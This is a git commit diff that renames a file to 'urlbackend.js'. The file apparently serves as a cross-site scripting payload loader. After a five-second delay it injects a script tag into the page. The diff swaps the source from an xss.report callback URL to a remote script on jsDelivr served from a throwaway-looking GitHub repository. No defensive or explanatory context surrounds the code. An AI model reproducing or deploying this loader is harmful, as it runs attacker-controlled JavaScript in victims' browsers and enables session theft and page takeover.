ef7fd4fad8c1d087b748a4913aeb70149dece899
itsguysbosthostbot24 <77636716+itsguysbosthostbot24@users.noreply.github.com>
2025-02-01 02:52:18 +0100

    Update and rename urlbackend to urlbackend.js

--- urlbackend.js
+++ urlbackend.js
@@ -1,5 +1,5 @@
 setTimeout(() => {
     const script = document.createElement("script");
-    script.src = "https://xss.report/c/blackfire";
+    script.src = "https://cdn.jsdelivr.net/gh/itsguysbosthostbot24/hihihaha@main/script123.js";
     document.body.appendChild(script);
 }, 5000); // 5000 ms = 5 másodperc
